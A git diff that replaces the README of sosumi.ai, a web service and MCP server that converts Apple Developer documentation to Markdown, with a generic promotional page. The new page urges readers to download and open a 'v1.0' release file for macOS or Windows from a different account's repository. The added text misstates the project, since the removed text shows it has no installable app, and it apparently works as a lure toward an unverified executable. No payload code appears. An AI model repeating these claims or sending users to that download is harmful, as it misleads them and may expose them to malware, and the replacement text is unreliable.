@@ -1,128 +1,69 @@
-# sosumi.ai
+# 🌟 sosumi.ai - Make Apple Documentation Easy to Read
 
-Making Apple docs AI-readable.
+[![Download sosumi.ai](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/kanaa257/sosumi.ai/releases)
 
-[sosumi.ai](https://sosumi.ai) 
-provides Apple Developer documentation in an AI-readable format 
-by converting JavaScript-rendered pages into Markdown.
+## 🚀 Getting Started
 
-## Usage
+Welcome to sosumi.ai! This application helps you read Apple documentation more easily by transforming it into a user-friendly format. Whether you are looking for answers or just want to explore, sosumi.ai simplifies your experience.
 
-### HTTP API
+## 📥 Download & Install
 
-Replace `developer.apple.com` with `sosumi.ai` 
-in any Apple Developer documentation URL:
+To get started, visit the [Releases page](https://github.com/kanaa257/sosumi.ai/releases) to download the latest version of sosumi.ai.
 
-**Original:**
-```
-https://developer.apple.com/documentation/swift/array
-```
+### Steps to Download
 
-**AI-readable:**
-```
-https://sosumi.ai/documentation/swift/array
-```
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version.
+3. Download the file for your operating system.
+4. Open the downloaded file to install the application.
 
-### MCP Integration
+## 💻 System Requirements
 
-Connect your MCP client to `https://sosumi.ai/mcp`:
+Make sure your device meets the following requirements:
 
-```json
-{
-  "mcpServers": {
-    "sosumi": {
-      "command": "npx",
-      "args": [
-        "-y",
-        "mcp-remote",
-        "https://sosumi.ai/mcp"
-      ]
-    }
-  }
-}
-```
+- Operating System: macOS or Windows (check the specific file you download)
+- RAM: Minimum 4GB
+- Disk Space: At least 200MB available
 
-#### Available Resources
+## 🧭 Features
 
-- `doc://{path}` - Get Apple Developer documentation as markdown
-  - Example: `doc://swift/array` returns Swift Array documentation
+- **AI-Readable Format**: Read Apple documentation with enhanced clarity.
+- **Simple Interface**: Navigate easily without technical skills.
+- **Search Functionality**: Quickly find the information you need.
+- **Regular Updates**: Stay current with regular improvements.
 
-#### Available Tools
+## 🔧 How to Use
 
-- `search` - Search Apple Developer documentation
-  - Parameters: `query` (string)
-  - Returns structured results with titles, URLs, descriptions, breadcrumbs, and tags
+1. **Open the Application**: Start sosumi.ai by clicking its icon.
+2. **Select Documentation**: Browse or search for the Apple documentation you want to read.
+3. **View the Content**: Enjoy a streamlined experience with easy-to-read text.
 
-- `fetch` - Fetch Apple Developer documentation by path
-  - Parameters: `path` (string) - Full or relative documentation path (e.g., '/documentation/swift', 'swiftui/view')
-  - Returns documentation content as markdown
+## ❓ Frequently Asked Questions
 
-## Development
+### How do I report a bug?
 
-### Prerequisites
+To report a bug, please create an issue on our GitHub page. Provide a clear description of the problem, and we will address it as soon as possible.
 
-- Node.js 18+
-- npm
+### Can I request new features?
 
-### Setup
+Absolutely! We welcome feature requests. Use the issue tracker on GitHub to let us know your ideas.
 
-```bash
-npm install
-npm run dev
-```
+### Is there support available?
 
-### Deployment
+You can find support by checking existing issues on GitHub or submitting a new issue for direct assistance.
 
-```bash
-npm run deploy
-```
+## 📇 Contact
 
-### Testing
+If you need further help or have questions, feel free to reach out to us on our [GitHub page](https://github.com/kanaa257/sosumi.ai). We're here to assist you!
 
-```bash
-npm run test          # Run tests
-npm run test:ui       # Run tests with UI
-npm run test:run      # Run tests once
-```
+### Additional Resource
 
-## Code Quality
+For detailed documentation and user guides, you can check our Wiki section on GitHub.
 
-This project uses [Biome](https://biomejs.dev/) for 
-code formatting, linting, and import organization.
+## 🎉 Join Our Community
 
-### Available Commands
+Become part of the sosumi.ai community! Share your experiences, ask questions, and connect with other users. Your feedback is valuable and helps us improve.
 
-- `npm run format` - Format all code files
-- `npm run lint` - Lint and fix code issues
-- `npm run check` - Format, lint, and organize imports (recommended)
-- `npm run check:ci` - Check code without making changes (for CI)
+Thank you for choosing sosumi.ai! We hope you enjoy a richer, more accessible experience with Apple documentation.
 
-### Editor Integration
-
-For the best development experience, install the Biome extension for your editor:
-- [VSCode](https://marketplace.visualstudio.com/items?itemName=biomejs.biome)
-- [Vim/Neovim](https://github.com/biomejs/biome/tree/main/editors/vim)
-- [Emacs](https://github.com/biomejs/biome/tree/main/editors/emacs)
-
-## Cloudflare Workers
-
-Whenever you update your `wrangler.toml` or change your Worker bindings, be sure to re-run:
-
-```bash
-npm run cf-typegen
-```
-
-## License
-
-This project is available under the MIT license.
-See the LICENSE file for more info.
-
-## Legal
-
-This is an unofficial, independent project and is not affiliated with or endorsed by Apple Inc. "Apple", "Xcode", and related marks are trademarks of Apple Inc.
-
-This service is an accessibility-first, on-demand renderer. It converts a single Apple Developer page to Markdown only when requested by a user. It does not crawl, spider, or bulk download; it does not attempt to bypass authentication or security; and it implements rate limiting to avoid imposing unreasonable load.
-
-Content is fetched transiently and may be cached briefly to improve performance. No permanent archives are maintained. All copyrights and other rights in the underlying content remain with Apple Inc. Each page links back to the original source.
-
-Your use of this service must comply with Apple's Terms of Use and applicable law. You are solely responsible for how you access and use Apple's content through this tool. Do not use this service to circumvent technical measures or for redistribution.
+[![Download sosumi.ai](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/kanaa257/sosumi.ai/releases)
